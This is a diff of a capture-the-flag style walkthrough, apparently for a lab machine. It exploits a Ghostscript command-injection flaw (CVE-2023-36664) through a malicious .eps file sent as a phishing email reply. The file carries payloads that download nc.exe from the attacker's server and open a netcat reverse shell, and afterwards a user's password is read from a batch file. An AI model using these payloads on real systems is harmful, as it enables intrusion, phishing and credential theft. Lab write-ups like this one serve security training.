@@ -354,27 +354,60 @@ ssh drwilliams@10.10.11.241
 
 <figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>
 
-* Sent -> there are .eps attachments
+* there are .eps attachments
+* drbrown says sth about GhostScript
   * lets craft malicious one
     * [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
       * Ghostscript command injection
 
-CVE Exploit
+#### Path traversal to drbrown&#x20;
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>Craft file.eps exploit</p></figcaption></figure>
+1. UPLOAD EXPLOIT TO TARGET MACHINE
+
+* `git clone https://github.com/int0x33/nc.exe/`
+  * `cd nc.exe`
+* Prepare http.server for serving our exploit
+  * `python3 -m http.server 8083`
+
+<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+
+* Craft .eps Exploit
+  * `python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.7:8083/nc64.exe -o nc.exe" --filename file.eps`
+
+<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+
+* upload it via email attachment (.eps file) answering to drbrown email...
+  * phishing
 
 <figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>
 
-`git clone https://github.com/int0x33/nc.exe/`
+* we successfully served nc.exe to our http.server
 
 <figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
-update file.eps exploit with netcat...
+2. OBTAIN REVERSE SHELL
+
+* Crafted second file.eps exploit with netcat port...
+  * `python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.7 4444 -e cmd.exe" --filename file.eps`
+
+<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+
+* `nc -nlvp 4444`
+
+<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 * upload exploit via answering email
-* nc -nlvp 4444
+
+<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+
+* we have a reverse shell to user DRBROWN
 
 <figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+#### drbrown credentials
+
+* `dir`
+* `type ghostscript.bat`
 
 <figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>
 
@@ -393,6 +426,8 @@ REMINNA&#x20;
 <figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>
 
 we can see there is uploaded shell.php
+
+
 
 <figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
